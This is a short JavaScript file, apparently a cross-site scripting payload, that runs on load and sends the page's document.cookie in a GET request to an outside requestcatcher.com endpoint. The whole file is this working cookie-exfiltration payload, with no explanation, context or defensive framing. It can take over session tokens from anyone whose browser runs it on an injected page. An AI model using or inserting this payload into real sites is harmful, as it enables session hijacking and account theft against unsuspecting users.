function sendMessage() {
	var request = new XMLHttpRequest();
	request.open("GET", "https://3ceaad7a-8dde-49e1-8b18-550cbe9fbc34.requestcatcher.com/test?script=external&"+document.cookie);
	request.send();
}
sendMessage()